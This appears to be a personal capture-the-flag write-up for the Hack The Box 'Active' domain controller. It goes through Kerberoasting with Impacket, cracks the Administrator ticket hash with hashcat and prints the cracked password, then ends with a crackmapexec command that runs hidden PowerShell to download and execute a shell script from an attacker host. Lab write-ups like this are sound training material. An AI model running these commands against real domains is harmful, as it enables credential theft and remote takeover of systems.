# pre auth
not working
```bash
└─$ GetNPUsers.py active.htb/SVC_TGS@dc.active.htb -no-pass -dc-ip 10.10.10.100
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for SVC_TGS@dc.active.htb
[-] User SVC_TGS@dc.active.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
```

but we can get the hash of a ticket with
first we need to get in time sync with the dc
sudo ntpdate 10.10.10.100


```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile hashes.kerberoast
```

![[docs/Pasted image 20210708002514.png]]

and we can crack it

```powershell
.\hashcat.exe -m 13100 -o cracked.txt hash.txt ..\rockyou.txt
```

```plain
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$87b8e9bb0889872c057c7a0a7dc8bb98$2448e5fc5d7a0e68003eb33f97cd8c2a2e8d615279cfa3d8e3f7d54f62647b84e0f8d5c24fd75c0abf663145fe7efa316854f327109dfc7b2eddb7bc979981d627f9c0395580ea69572faaca796031bc454bc9005f018b1315643dd60263cb3cc8cda2abb9df2a7a624ffafb948c6aa4a2cd9499342081ade6f31f4dde9d9b794448c4940f57be075f98274b645f54393abde131d58dc4fcd52c26cd6d274f556ebedaca914797008fdb02ba48cc78c65cdb880205d1b6be9d98eff0e3383ef9df39a9aa73a077a6950dda1cc23b4eff53989fe89ac511cb6646050d094ba67068a893e24fa472bd0aa8484feef7202b436d592c59766e1dfe6ab696641e182200e6c2a623340b58b46c3a1e53a1e6f51248a42a6c4921045d4ac116874d02246261569e92ba3ed84567c3348e43cc55ea2673b2f3037c50b3dea43423043dfc6bce1b47b25581a3ec59486e216d5055daafd94e8d38cee5a5d2c90ef2ab844992dc8859e15e1aaec77c8303aa37ac88d3672a30cba5bd00ab316eb9cfe8e45a3f1a2b9591eb60fedd0e2def25296ff26a8b8aa5ac7ddc425085b6049bcebff35531e25018ae20a848bec1f98551e16df0e559d525841973e7c4a852d771a80b605d3ba5c3dec6cd1b5afedbe96c3955dbe789aa85c88a58fc89e026723b353454f4757ec03cd8cf039fd821fc76fb23f6d7cb2b7704b6c4232701d892f82d35fd6272c96040845b78eba7ee099014d822ef0f2dd4553c79403da6e79562c4175916501748144cbb846c619b6312c0bf1263cf6a62e76181c88123d6a89844fe9caba1aeb87b9fdacfda16790cfe22493ec5b161abc65a078af7b544d0dc24a61503583e3d4918dd77746a6fd6a80980bb5f8ed51de305fbfa96cffb17401ec0ad6d63559f78ea9911142b067c7cd0f7e5caec4d8d98372ec351783deef056eba834addd6f1f07680d3751a38c68da6b3b2855b300d98bdca4fe9025fb42317d72e97484185e95a17802476623c275abb9789da30f53b87ddb34ca24f7f8b505603639b57b0f4fec4502e66f225b35659a3e1456208875eaa0b1017ab346be50f7bb94c4c1be392a9812373541ad8a1a6c23629d6c7e3388c281dece2dc369f25cd6522f44308dc1dbb545e15426c7d4784b588a207f0a350a88e7c6fa847179cc231db29c0406ef7250d86acd189e7e73772ac548b783eb642f4b8210487d703892005e2d3813cac7e9452c4c67e4fbac52427045c789dc81c4:Ticketmaster1968
```

Password: Ticketmaster1968

```bash
└─$ smbmap -H 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
[+] IP: 10.10.10.100:445        Name: DC.active.htb
[-] Work[!] Unable to remove test directory at \\10.10.10.100\SYSVOL\UGEHDPTACM, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE     Logon server share
        Users                                                   READ ONLY
```

we have full acces to smb so we can use crackmapexec to spawn a shell

```bash
crackmapexec smb 10.10.10.100  -u 'Administrator' -p 'Ticketmaster1968' -x "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.188/shell.ps1');"`
```

[[99 - Loot]]